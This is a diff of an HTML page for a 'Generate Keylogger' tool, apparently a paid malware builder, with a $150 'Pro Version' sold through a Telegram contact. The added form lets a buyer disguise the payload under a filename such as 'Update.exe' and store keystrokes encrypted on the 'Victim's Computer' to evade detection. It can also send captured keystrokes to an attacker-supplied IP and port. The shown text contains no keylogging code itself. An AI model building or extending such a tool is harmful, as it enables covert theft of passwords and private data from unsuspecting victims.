@@ -8,19 +8,33 @@
 </head>
 <body style="background-image: url('/images/generate.jfif');background-repeat: no-repeat; background-size: 100vw 100vh;">
     <h1 class="page-title">Generate Keylogger</h1>
-    <div class="controls">
-        <form action="js:console.log('Doneeeqwe')">
-            <label>Filename</label><input type="text">
+    <p class="page-info">A Custom Keylogger Generator, You Need to Buy The Pro Version in Order to Generate Your own Custom Keyloggers, Lifetime Access With Just <span style="color: rgb(0, 255, 0);">$150</span> <a href="https://t.me/MahmoudOsman0" style="color: white">Contact Me On Telegram @MahmoudOsman0</a></p>
+    <div class="controls" style="margin-top: 10px;">
+        <form action="js:void(0)">
+            <label>Filename</label><input type="text" placeholder="Example: Update.exe">
             <label>Type</label>
-            <break/>
-            <input type="checkbox" name="Offline" checked> <label>Online</label>
-            <break/>
-            <input type="checkbox" name="Online"> <label>Offline</label>
-            <break/>
-            <button>Create</button>
+            <choice>Online</choice>
+            <choice>Offline</choice>
+            <hr>
+            <button id="create">Create</button>
         </form>
-        
+        <hr>
+        <div style="display:none" id="offlinesetup">
+            <form action="js:void(0)">
+                <label>Store Keystrokes</label><input type="text" placeholder="C:\Public\Windows\Keys">
+                <p>Note That Captured Keypresses Are Encrypted on Victim's Computer, You Can Read it Only Using Cran Interface, This Will Reduce The Chance Of Detection.</p>
+            </form>
+            <bpv></bpv>
+        </div>
+        <div style="display:none" id="onlinesetup">
+            <form action="js:void(0)">
+                <label>IP</label><input type="text" placeholder="IP Address">
+                <label>Port</label><input type="text" placeholder="Port Number">
+            </form>
+            <bpv></bpv>
+        </div>
     </div>
     <script src="/js/generator.js"></script>
+    <script src="/js/main.js"></script>
 </body>
 </html>
